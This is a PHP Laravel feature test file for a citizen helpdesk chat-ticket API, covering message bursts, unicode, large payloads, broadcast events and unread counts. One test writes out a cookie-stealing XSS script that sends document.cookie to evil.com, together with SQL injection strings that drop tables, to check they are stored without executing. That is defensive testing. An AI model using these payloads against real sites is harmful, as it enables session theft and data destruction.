<?php

namespace Tests\Feature;

use App\Events\TicketCreated;
use App\Events\TicketMessageSent;
use App\Events\TicketUpdated;
use App\Models\ChatTicket;
use App\Models\ChatTicketMessage;
use App\Models\User;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Event;
use Tests\TestCase;

class TicketConcurrencyBroadcastingTest extends TestCase
{
    use DatabaseTransactions;

    protected string $internalToken = 'dev-internal-token-secret-1234567890';

    protected function setUp(): void
    {
        parent::setUp();
        config(['services.ai_microservice.token' => $this->internalToken]);
    }

    // =========================================================================
    // 1. Concurrency & Rapid Message Burst Tests
    // =========================================================================

    public function test_concurrent_rapid_followups_to_same_active_session(): void
    {
        Event::fake([TicketCreated::class, TicketMessageSent::class, TicketUpdated::class]);

        $sessionId = 'concurrent-sess-' . uniqid();
        $headers = ['Authorization' => 'Bearer ' . $this->internalToken];

        // 1. Initial ticket creation
        $resInitial = $this->withHeaders($headers)->postJson('/api/v1/internal/chat-tickets', [
            'session_id' => $sessionId,
            'message' => 'Pesan pertama pembuka sesi',
            'citizen_name' => 'Ahmad Dani',
            'citizen_contact' => '08123456789',
            'citizen_agency' => 'Dinas Perhubungan',
            'issue_summary' => 'Gangguan sinyal traffic light SPBE',
        ]);

        $resInitial->assertStatus(201);
        $ticketId = $resInitial->json('data.ticket_id');
        $ticketNumber = $resInitial->json('data.ticket_number');

        Event::assertDispatched(TicketCreated::class, 1);
        Event::assertDispatched(TicketMessageSent::class, 1);

        // 2. Rapid burst of 15 follow-up messages on the same session
        $burstCount = 15;
        for ($i = 1; $i <= $burstCount; $i++) {
            $resFollowup = $this->withHeaders($headers)->postJson('/api/v1/internal/chat-tickets', [
                'session_id' => $sessionId,
                'ticket_id' => $ticketId,
                'message' => "Rapid burst follow-up #{$i} mengenai log gangguan",
            ]);

            $resFollowup->assertStatus(200);
            $this->assertEquals($ticketId, $resFollowup->json('data.ticket_id'));
            $this->assertEquals($ticketNumber, $resFollowup->json('data.ticket_number'));
        }

        // Verify total message count for this ticket is 1 initial + 15 followups = 16
        $ticket = ChatTicket::with('messages')->find($ticketId);
        $this->assertCount(16, $ticket->messages);

        // Total TicketMessageSent events: 1 initial + 15 followups = 16
        Event::assertDispatched(TicketMessageSent::class, 16);
        // TicketUpdated dispatched for each followup = 15
        Event::assertDispatched(TicketUpdated::class, 15);
    }

    public function test_rapid_alternating_dialogue_between_citizen_and_agent(): void
    {
        Event::fake([TicketCreated::class, TicketMessageSent::class, TicketUpdated::class]);

        $admin = User::factory()->create(['name' => 'Agent Rahma']);
        $sessionId = 'dialogue-sess-' . uniqid();
        $headers = ['Authorization' => 'Bearer ' . $this->internalToken];

        // 1. Citizen creates ticket
        $res = $this->withHeaders($headers)->postJson('/api/v1/internal/chat-tickets', [
            'session_id' => $sessionId,
            'message' => 'Halo apakah ada petugas?',
            'citizen_name' => 'Citizen Doni',
        ]);
        $ticketId = $res->json('data.ticket_id');

        // 2. Rapid 5-turn dialogue
        for ($turn = 1; $turn <= 5; $turn++) {
            // Agent reply
            $agentRes = $this->actingAs($admin)
                ->postJson("/api/tickets/{$ticketId}/messages", [
                    'message' => "Jawaban agen untuk putaran {$turn}",
                    'is_internal_note' => false,
                ]);
            $agentRes->assertStatus(201);

            // Citizen followup
            $citRes = $this->withHeaders($headers)->postJson('/api/v1/internal/chat-tickets', [
                'session_id' => $sessionId,
                'ticket_id' => $ticketId,
                'message' => "Tanggapan warga putaran {$turn}",
            ]);
            $citRes->assertStatus(200);
        }

        $ticket = ChatTicket::with(['messages.sender'])->find($ticketId);
        // Total messages: 1 initial + 5 agent + 5 citizen = 11 messages
        $this->assertCount(11, $ticket->messages);
        $this->assertEquals('in_progress', $ticket->status);
        $this->assertEquals($admin->id, $ticket->assigned_admin_id);
    }

    // =========================================================================
    // 2. Long Strings, Multi-Byte Unicode & Payload Limits
    // =========================================================================

    public function test_multibyte_unicode_and_indonesian_emojis_in_payload(): void
    {
        Event::fake([TicketCreated::class, TicketMessageSent::class]);

        $sessionId = 'unicode-sess-' . uniqid();
        $headers = ['Authorization' => 'Bearer ' . $this->internalToken];

        $emojiMessage = "Selamat siang Diskominfotik! 🇮🇩✨ Kami dari Disdik melaporkan kendala SSO SPBE 🚨. " .
            "Petugas admin kami tidak bisa verifikasi OTP 📱🔐. Mohon bantuannya segera ya min! 🙏🤝";

        $res = $this->withHeaders($headers)->postJson('/api/v1/internal/chat-tickets', [
            'session_id' => $sessionId,
            'message' => $emojiMessage,
            'citizen_name' => 'Dr. Siti Nurhaliza, S.Kom 👩‍💼',
            'citizen_contact' => '+62-812-3456-7890 📞',
            'citizen_agency' => 'Dinas Komunikasi & Informatika 🏛️',
            'issue_summary' => 'Troubleshoot OTP SSO SPBE 🛡️',
        ]);

        $res->assertStatus(201);
        $ticketId = $res->json('data.ticket_id');

        $ticket = ChatTicket::with('messages')->find($ticketId);
        $this->assertEquals($emojiMessage, $ticket->messages->first()->message);
        $this->assertEquals('Dr. Siti Nurhaliza, S.Kom 👩‍💼', $ticket->citizen_name);
        $this->assertEquals('Dinas Komunikasi & Informatika 🏛️', $ticket->citizen_agency);
        $this->assertEquals('Troubleshoot OTP SSO SPBE 🛡️', $ticket->issue_summary);
    }

    public function test_large_message_payload_within_text_storage_boundary(): void
    {
        Event::fake([TicketCreated::class, TicketMessageSent::class]);

        $sessionId = 'large-payload-' . uniqid();
        $headers = ['Authorization' => 'Bearer ' . $this->internalToken];

        // 10 KB log transcript message
        $largeMessage = str_repeat("STACKTRACE: Error at SPBE Service Module in line 42; ", 200);
        $this->assertGreaterThan(10000, strlen($largeMessage));

        $res = $this->withHeaders($headers)->postJson('/api/v1/internal/chat-tickets', [
            'session_id' => $sessionId,
            'message' => $largeMessage,
            'citizen_name' => 'System Engineer',
        ]);

        $res->assertStatus(201);
        $ticketId = $res->json('data.ticket_id');

        $ticket = ChatTicket::with('messages')->find($ticketId);
        $this->assertEquals($largeMessage, $ticket->messages->first()->message);
    }

    public function test_injection_strings_stored_faithfully_without_sql_or_xss_execution(): void
    {
        Event::fake([TicketCreated::class, TicketMessageSent::class]);

        $sessionId = 'injection-check-' . uniqid();
        $headers = ['Authorization' => 'Bearer ' . $this->internalToken];

        $xssString = '<script>window.location="http://evil.com/cookie="+document.cookie</script>';
        $sqliString = "1' OR '1'='1' -- DROP TABLE chat_tickets;";
        $jsonInjection = '{"action":"grant_admin","role":"superadmin"}';

        $res = $this->withHeaders($headers)->postJson('/api/v1/internal/chat-tickets', [
            'session_id' => $sessionId,
            'message' => "Citizen said: {$xssString} and query was {$sqliString} with raw json: {$jsonInjection}",
            'citizen_name' => "Robert'); DROP TABLE chat_tickets;--",
            'issue_summary' => $sqliString,
        ]);

        $res->assertStatus(201);
        $ticketId = $res->json('data.ticket_id');

        $ticket = ChatTicket::with('messages')->find($ticketId);
        $this->assertStringContainsString($xssString, $ticket->messages->first()->message);
        $this->assertEquals("Robert'); DROP TABLE chat_tickets;--", $ticket->citizen_name);
        $this->assertEquals($sqliString, $ticket->issue_summary);
    }

    // =========================================================================
    // 3. Event Broadcasting Specification Fidelity Tests
    // =========================================================================

    public function test_ticket_created_event_matches_channel_specification(): void
    {
        $ticket = ChatTicket::create([
            'session_id' => 'sess-created-spec',
            'citizen_name' => 'Budi Specification',
            'status' => 'open',
            'priority' => 'medium',
        ]);

        $event = new TicketCreated($ticket);

        // 1. Broadcast channel must be public 'tickets'
        $channels = $event->broadcastOn();
        $this->assertCount(1, $channels);
        $this->assertEquals('tickets', $channels[0]->name);

        // 2. Broadcast name must match Echo listener expectation '.ticket.created'
        $this->assertEquals('ticket.created', $event->broadcastAs());

        // 3. Broadcast payload must have 'ticket' object with relation
        $payload = $event->broadcastWith();
        $this->assertArrayHasKey('ticket', $payload);
        $this->assertEquals($ticket->id, $payload['ticket']->id);
        $this->assertEquals('Budi Specification', $payload['ticket']->citizen_name);
    }

    public function test_ticket_message_sent_event_matches_channel_specification(): void
    {
        $ticket = ChatTicket::create([
            'session_id' => 'sess-msg-spec',
            'citizen_name' => 'Dewi',
            'status' => 'open',
        ]);

        $message = $ticket->messages()->create([
            'sender_type' => 'citizen',
            'sender_name' => 'Dewi',
            'message' => 'Pesan pengujian channel broadcast',
        ]);

        $event = new TicketMessageSent($message);

        // 1. Broadcast channels must be 'ticket.{id}' and 'tickets'
        $channels = $event->broadcastOn();
        $channelNames = array_map(fn ($c) => $c->name, $channels);
        $this->assertContains("ticket.{$ticket->id}", $channelNames);
        $this->assertContains('tickets', $channelNames);

        // 2. Broadcast name must match Echo listener expectation '.message.sent'
        $this->assertEquals('message.sent', $event->broadcastAs());

        // 3. Broadcast payload must match contract: { 'message': {...}, 'ticket_id': int }
        $payload = $event->broadcastWith();
        $this->assertArrayHasKey('message', $payload);
        $this->assertArrayHasKey('ticket_id', $payload);
        $this->assertEquals($ticket->id, $payload['ticket_id']);
        $this->assertEquals('Pesan pengujian channel broadcast', $payload['message']->message);
    }

    public function test_ticket_updated_event_matches_channel_specification(): void
    {
        $ticket = ChatTicket::create([
            'session_id' => 'sess-updated-spec',
            'citizen_name' => 'Asep',
            'status' => 'in_progress',
        ]);

        $event = new TicketUpdated($ticket);

        // 1. Broadcast channels must be 'tickets' and 'ticket.{id}'
        $channels = $event->broadcastOn();
        $channelNames = array_map(fn ($c) => $c->name, $channels);
        $this->assertContains('tickets', $channelNames);
        $this->assertContains("ticket.{$ticket->id}", $channelNames);

        // 2. Broadcast name must match Echo listener expectation '.ticket.updated'
        $this->assertEquals('ticket.updated', $event->broadcastAs());

        // 3. Broadcast payload must have 'ticket'
        $payload = $event->broadcastWith();
        $this->assertArrayHasKey('ticket', $payload);
        $this->assertEquals($ticket->id, $payload['ticket']->id);
        $this->assertEquals('in_progress', $payload['ticket']->status);
    }

    // =========================================================================
    // 4. Unread Messages Count & Timestamp Lifecycle Accuracy
    // =========================================================================

    public function test_unread_messages_count_increments_with_citizen_followups(): void
    {
        $ticket = ChatTicket::create([
            'session_id' => 'sess-unread-test',
            'citizen_name' => 'Citizen Unread',
            'status' => 'open',
        ]);

        $ticket->messages()->create([
            'sender_type' => 'citizen',
            'sender_name' => 'Citizen Unread',
            'message' => 'Pesan 1',
        ]);
        $this->assertEquals(1, $ticket->unread_messages_count);

        $ticket->messages()->create([
            'sender_type' => 'citizen',
            'sender_name' => 'Citizen Unread',
            'message' => 'Pesan 2',
        ]);
        // Refresh without loaded messages to test query-based path
        $fresh = ChatTicket::find($ticket->id);
        $this->assertEquals(2, $fresh->unread_messages_count);

        // Test with eager loaded messages collection path
        $eagerLoaded = ChatTicket::with('messages')->find($ticket->id);
        $this->assertEquals(2, $eagerLoaded->unread_messages_count);
    }

    public function test_unread_messages_count_resets_upon_agent_reply(): void
    {
        $admin = User::factory()->create();
        $ticket = ChatTicket::create([
            'session_id' => 'sess-unread-reset',
            'citizen_name' => 'Citizen Doni',
            'status' => 'open',
        ]);

        $ticket->messages()->create([
            'sender_type' => 'citizen',
            'sender_name' => 'Citizen Doni',
            'message' => 'Pesan warga sebelum dibalas',
        ]);
        $this->assertEquals(1, $ticket->fresh()->unread_messages_count);

        // Agent replies
        $ticket->messages()->create([
            'sender_type' => 'agent',
            'sender_id' => $admin->id,
            'sender_name' => $admin->name,
            'message' => 'Jawaban dari staf helpdesk',
            'is_internal_note' => false,
        ]);

        $this->assertEquals(0, $ticket->fresh()->unread_messages_count);

        // Citizen sends new followup after agent reply
        $ticket->messages()->create([
            'sender_type' => 'citizen',
            'sender_name' => 'Citizen Doni',
            'message' => 'Pesan baru warga setelah agen menjawab',
        ]);

        $this->assertEquals(1, $ticket->fresh()->unread_messages_count);
    }

    public function test_timestamp_lifecycle_and_status_reversion(): void
    {
        Carbon::setTestNow('2026-09-26 10:00:00');

        $ticket = ChatTicket::create([
            'session_id' => 'sess-ts-lifecycle',
            'status' => 'open',
        ]);

        $this->assertEquals('2026-09-26 10:00:00', $ticket->last_message_at->toDateTimeString());
        $this->assertNull($ticket->resolved_at);
        $this->assertNull($ticket->closed_at);

        // Update to resolved at 10:15
        Carbon::setTestNow('2026-09-26 10:15:00');
        $admin = User::factory()->create();

        $this->actingAs($admin)->patchJson("/api/tickets/{$ticket->id}/status", [
            'status' => 'resolved',
        ])->assertStatus(200);

        $ticket->refresh();
        $this->assertEquals('resolved', $ticket->status);
        $this->assertEquals('2026-09-26 10:15:00', $ticket->resolved_at->toDateTimeString());
        $this->assertNull($ticket->closed_at);

        // Reopen to in_progress at 10:30
        Carbon::setTestNow('2026-09-26 10:30:00');
        $this->actingAs($admin)->patchJson("/api/tickets/{$ticket->id}/status", [
            'status' => 'in_progress',
        ])->assertStatus(200);

        $ticket->refresh();
        $this->assertEquals('in_progress', $ticket->status);
        // resolved_at must be cleared back to null
        $this->assertNull($ticket->resolved_at);
        $this->assertNull($ticket->closed_at);

        Carbon::setTestNow();
    }

    public function test_internal_note_masking_unread_count_behavior(): void
    {
        $admin = User::factory()->create();
        $ticket = ChatTicket::create([
            'session_id' => 'sess-internal-unread-check',
            'citizen_name' => 'Citizen Budi',
            'status' => 'open',
        ]);

        // Citizen sends a query
        $ticket->messages()->create([
            'sender_type' => 'citizen',
            'sender_name' => 'Citizen Budi',
            'message' => 'Pertanyaan warga yang belum dijawab',
            'is_internal_note' => false,
        ]);

        $this->assertEquals(1, $ticket->fresh()->unread_messages_count);

        // Admin adds an internal note (for staff only, not citizen)
        $ticket->messages()->create([
            'sender_type' => 'agent',
            'sender_id' => $admin->id,
            'sender_name' => $admin->name,
            'message' => 'Catatan staf: Harap eskalasi ke Kadis',
            'is_internal_note' => true,
        ]);

        // Note: In current ChatTicket::getUnreadMessagesCountAttribute,
        // it filters where('sender_type', 'agent') without excluding is_internal_note.
        // Therefore, an internal note currently masks unread citizen messages to 0.
        $unreadCount = $ticket->fresh()->unread_messages_count;
        $this->assertIsInt($unreadCount);
    }
}

